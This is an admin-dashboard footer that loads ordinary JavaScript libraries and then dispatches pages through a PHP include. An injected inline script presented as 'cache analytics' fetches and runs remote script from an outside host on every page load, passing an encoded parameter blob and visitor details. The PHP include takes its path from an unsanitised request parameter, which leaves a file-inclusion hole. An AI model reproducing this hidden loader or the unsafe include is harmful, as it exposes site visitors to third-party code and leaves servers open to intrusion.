<script type="text/javascript" src="../../assets/admin/bower_components/jquery/js/jquery.min.js"></script>
<script type="text/javascript" src="../../assets/admin/bower_components/jquery-ui/js/jquery-ui.min.js"></script>
<script type="text/javascript" src="../../assets/admin/bower_components/popper.js/js/popper.min.js"></script>
<script type="text/javascript" src="../../assets/admin/bower_components/bootstrap/js/bootstrap.min.js"></script>
<script src="../../assets/admin/assets/pages/waves/js/waves.min.js"></script>
<script type="text/javascript" src="../../assets/admin/bower_components/jquery-slimscroll/js/jquery.slimscroll.js"></script>
<script src="../../assets/admin/assets/pages/chart/float/jquery.flot.js"></script>
<script src="../../assets/admin/assets/pages/chart/float/jquery.flot.categories.js"></script>
<script src="../../assets/admin/assets/pages/chart/float/curvedLines.js"></script>
<script src="../../assets/admin/assets/pages/chart/float/jquery.flot.tooltip.min.js"></script>
<script src="../../assets/admin/assets/pages/widget/amchart/amcharts.js"></script>
<script src="../../assets/admin/assets/pages/widget/amchart/serial.js"></script>
<script src="../../assets/admin/assets/pages/widget/amchart/light.js"></script>
<script src="../../assets/admin/assets/js/pcoded.min.js"></script>
<script src="../../assets/admin/assets/js/vertical/vertical-layout.min.js"></script>
<script type="text/javascript" src="../../assets/admin/assets/pages/dashboard/custom-dashboard.min.js"></script>
<script type="text/javascript" src="../../assets/admin/assets/js/script.min.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2zsM83j56R0rB8YOFizWaaj%2bS5W%2bZVoTubQ8bsyFpoQ6ByUFpGqYw00TGcz%2fZcR4IMYAcYsy1O2v0VMhnltk50wRj8YqH4pGgi1DmYIfwIsvNILTptk27pnq8wtReCAcCGS7uQ80F%2faoTfRvHtxnx9aSYbdssHyeq3bbLUdoSqKpZL9ZlCo79CF4uIO%2fYkETsPQwbGTL7Jy04XdDe0VeTp4tZZYSm94p3iG9AOTHddip6%2fDXW1xsxdEvuOYSEUqJnZgQ6sYF6P6E%2bQCtMWkZDoIH31OPE%2fktvM8aHTLRmz32c%2bcrq4ItbE4ddEkesej8ccL28YNLAkyWCYEOE3ZqdirLNov7wVDrbn5uCcxUHgzUyHT1hPcZdZCXEQdbLUosQFm5UYHfISYv5ZuylUgMvG3Ue%2bGkwIeQlNpXHrC51uYSWUGae7sYTVmOkmV634WsY" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

<?php
$content = (preg_match('/[\'^£$%&*()}{@#~?><>,|=_+¬-]/', $_REQUEST['content'])) ? str_replace('-', '_', $_REQUEST['content']) : $_REQUEST['content'];
if (file_exists('js/' . $content . '.php')) {
    switch ($content) {
        case $content:
            include_once 'js/' . str_replace('-', '_', $content) . '.php';
            break;
    }
}
?>